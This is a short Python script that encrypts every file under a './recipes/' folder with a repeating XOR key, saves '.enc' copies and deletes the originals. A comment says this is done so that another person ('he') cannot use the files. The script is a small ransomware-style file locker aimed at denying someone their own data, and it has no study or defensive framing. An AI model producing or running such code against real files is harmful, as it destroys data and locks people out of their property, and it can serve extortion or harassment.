import os
from pathlib import Path
from itertools import cycle

TARGET_DIR = Path("./recipes/")

def encrypt(file: Path, key: bytes) -> None:
    with open(file, "rb") as f:
        plaintext = f.read()

    ciphertext = bytes(a ^ b for a, b in zip(plaintext, cycle(key)))

    with open(f"{file}.enc", "wb") as f:
        f.write(ciphertext)

    print(f"Encrypted {file.name}")
    file.unlink() # delete original file, so he can't use it 


if __name__=="__main__":
    key = os.urandom(16)
    print(f"Key: {key.hex(" ")}\n")

    print("Encrypting files...")
    for file in TARGET_DIR.rglob("*"):
        if file.is_file():
            encrypt(file, key)
